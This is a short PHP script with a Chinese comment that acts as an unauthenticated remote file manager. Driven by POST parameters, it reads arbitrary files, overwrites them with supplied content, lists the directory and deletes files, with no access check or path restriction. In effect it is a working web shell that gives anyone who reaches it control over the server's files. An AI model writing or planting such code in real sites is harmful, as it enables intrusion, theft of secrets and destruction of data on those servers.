<?php
$moth=$_POST["moth"];
$daima=$_POST["daima"];
$url=$_POST["filename"];
switch ($moth) {
	case '1':
		$fp=fopen($url, 'r');
		echo fread($fp, filesize($url));
		fclose($fp);
		break;
	case '2':
		$fp=fopen($url, 'w+');
		fwrite($fp, $daima);
		fclose($fp);
		$fp2=fopen($url, 'r');
		echo fread($fp2, filesize($url));
		fclose($fp2);
		break;
	case '3':
		read_all(".");
		break;
	case '4':
		unlink($url);
		break;
}
function read_all ($dir){
    if(!is_dir($dir)) return false;
     
     $handle = opendir($dir);
 
    if($handle){
         while(($fl = readdir($handle)) !== false){
         	if($fl=='.'||$fl=='..'){
         		continue;
         	}
             $temp =array();
             $temp[] =$fl;
             //如果不加  $fl!='.' && $fl != '..'  则会造成把$dir的父级目录也读取出来
             echo json_encode($temp);                            
         }
     }
 }
?>